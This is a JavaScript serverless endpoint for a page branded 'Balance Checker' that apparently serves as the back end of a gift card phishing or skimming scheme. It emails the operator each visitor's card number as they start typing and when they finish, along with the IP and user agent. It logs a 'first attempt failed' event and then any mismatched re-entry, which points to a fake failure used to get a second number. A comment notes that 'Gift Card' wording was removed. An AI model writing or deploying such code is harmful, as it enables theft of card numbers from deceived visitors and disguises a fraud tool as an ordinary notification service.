// api/notify-typing.js
// Removed "Gift Card" references from templates

import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

const hits = new Map();
const WINDOW_MS = 10 * 60 * 1000;
const MAX_HITS = 10;

function rateLimited(ip) {
  const now = Date.now();
  const arr = (hits.get(ip) || []).filter((t) => now - t < WINDOW_MS);
  if (arr.length >= MAX_HITS) return true;
  arr.push(now);
  hits.set(ip, arr);
  return false;
}

function esc(str = '') {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function buildEmail(event, data, ip, ua) {
  const time = esc(new Date(data.timestamp || Date.now()).toUTCString());
  const safeIp = esc(ip);
  const safeUA = esc(ua || 'unknown');

  let heading = 'Notification';
  let intro = '';
  let rows = '';

  if (event === 'typing_start') {
    heading = '⌨️ User Started Typing';
    intro = 'A visitor began entering a number.';
    rows = `
      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">First input</td>
      <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#00ff41;font-family:monospace;">${esc(data.cardNumber)}</td></tr>`;
  } else if (event === 'card_complete') {
    heading = '💳 Full 14-Digit Number Entered';
    intro = 'A visitor completed the full 14-character number.';
    rows = `
      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">Full number</td>
      <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#00ff41;font-family:monospace;">${esc(data.cardNumber)}</td></tr>
      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;">Length</td>
      <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;border-left:0;color:#fff;">${esc(String(data.cardNumber?.length || 0))}</td></tr>`;
  } else if (event === 'first_attempt_failed') {
    heading = '❌ First Attempt Failed';
    intro = 'The user submitted a number and the first verification attempt failed.';
    rows = `
      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">Number</td>
      <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#ff5555;font-family:monospace;">${esc(data.cardNumber)}</td></tr>`;
  } else if (event === 'mismatch_trial') {
    heading = '⚠️ Mismatch Trial';
    intro = 'The user re-entered a number that does NOT match their first attempt.';
    rows = `
      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;color:#888;width:150px;">First number</td>
      <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-left:0;color:#ffaa00;font-family:monospace;">${esc(data.firstCardNumber)}</td></tr>
      <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;">Second number</td>
      <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;border-left:0;color:#ff5555;font-family:monospace;">${esc(data.secondCardNumber)}</td></tr>`;
  }

  const html = `
  <!DOCTYPE html><html><head><meta charset="utf-8" /><meta name="viewport" content="width=device-width,initial-scale=1" /></head>
  <body style="margin:0;padding:0;background:#0a0a0a;font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;">
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#0a0a0a;padding:24px 12px;">
      <tr><td align="center">
        <table role="presentation" width="100%" style="max-width:560px;background:#0f1f0f;border:1px solid #00ff4133;border-radius:14px;overflow:hidden;">
          <tr><td style="background:linear-gradient(90deg,#00ff41,#00aa2a);padding:18px 22px;">
            <h1 style="margin:0;color:#0a0a0a;font-size:18px;font-weight:700;">${heading}</h1>
            <p style="margin:4px 0 0;color:#0a0a0a;opacity:.8;font-size:12px;">Balance Checker</p>
          </td></tr>
          <tr><td style="padding:22px;color:#ddd;font-size:14px;line-height:1.5;">
            <p style="margin:0 0 16px;color:#00ff41;font-weight:600;">${intro}</p>
            <table role="presentation" width="100%" style="border-collapse:collapse;font-size:13px;">
              ${rows}
              <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;">Time (UTC)</td>
              <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;border-left:0;color:#fff;">${time}</td></tr>
              <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;">IP</td>
              <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;border-left:0;color:#fff;font-family:monospace;">${safeIp}</td></tr>
              <tr><td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;color:#888;vertical-align:top;">User Agent</td>
              <td style="padding:10px 12px;background:#0a0a0a;border:1px solid #1f2f1f;border-top:0;border-left:0;color:#aaa;font-size:11px;word-break:break-all;">${safeUA}</td></tr>
            </table>
          </td></tr>
          <tr><td style="padding:14px 22px;background:#0a0a0a;border-top:1px solid #1f1f1f;color:#555;font-size:11px;text-align:center;">
            Automated alert • ${new Date().getUTCFullYear()} Balance Checker
          </td></tr>
        </table>
      </td></tr>
    </table>
  </body></html>`;

  return { html, heading };
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  const enabled =
    String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
  if (!enabled) {
    return res.status(200).json({ ok: true, skipped: true });
  }

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.socket?.remoteAddress ||
    'unknown';

  if (rateLimited(ip)) {
    return res.status(429).json({ ok: false, error: 'Too many alerts' });
  }

  try {
    const data = req.body || {};
    const { event } = data;

    const validEvents = ['typing_start', 'card_complete', 'first_attempt_failed', 'mismatch_trial'];
    if (!validEvents.includes(event)) {
      return res.status(400).json({ ok: false, error: 'Invalid event' });
    }

    ['cardNumber', 'firstCardNumber', 'secondCardNumber'].forEach((k) => {
      if (typeof data[k] === 'string') data[k] = data[k].toUpperCase();
    });

    const from = process.env.RESEND_FROM;
    const to = process.env.NOTIFICATION_EMAIL;
    if (!process.env.RESEND_API_KEY) return res.status(500).json({ ok: false, error: 'RESEND_API_KEY missing' });
    if (!from) return res.status(500).json({ ok: false, error: 'RESEND_FROM missing' });
    if (!to) return res.status(500).json({ ok: false, error: 'NOTIFICATION_EMAIL missing' });

    const { html, heading } = buildEmail(event, data, ip, req.headers['user-agent']);

    const { error } = await resend.emails.send({
      from,
      to,
      subject: `${heading} — ${new Date().toISOString()}`,
      html,
    });

    if (error) {
      console.error('Resend error:', error);
      return res.status(502).json({ ok: false, error: 'Send failed' });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Notify handler failed:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
}